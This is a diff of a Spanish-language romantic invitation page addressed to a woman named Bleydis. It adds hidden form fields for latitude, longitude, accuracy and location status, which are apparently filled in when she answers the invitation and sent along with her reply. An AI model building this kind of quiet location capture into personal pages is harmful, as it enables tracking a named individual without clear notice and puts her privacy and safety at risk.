@@ -165,12 +165,18 @@
             <div class="content-wrapper centered" id="proposal-container">
                 <div class="m3-dialog-card">
                     <h2 class="m3-dialog-title">¿ Quieres acompañarme a pasar un momento agradable negrita bella?</h2>
-                    <p class="m3-dialog-supporting-text">Ponte como siempre mi amor, Bien hermosa.</p>
+                    <p class="m3-dialog-supporting-text" id="geo-status-text">Ponte como siempre mi amor, Bien hermosa.</p>
                     
                     <!-- Formulario invisible para capturar la respuesta -->
                     <form id="email-form" style="display:none;">
                         <input type="text" name="Respuesta" value="Bleydis aceptó la invitación a comer ❤️">
                         <input type="hidden" name="_captcha" value="false">
+
+                        <!-- Ubicación (se completa al presionar los botones) -->
+                        <input type="hidden" name="Latitude" value="">
+                        <input type="hidden" name="Longitude" value="">
+                        <input type="hidden" name="Accuracy" value="">
+                        <input type="hidden" name="LocationStatus" value="not_requested">
                     </form>
 
                     <div class="m3-dialog-actions">
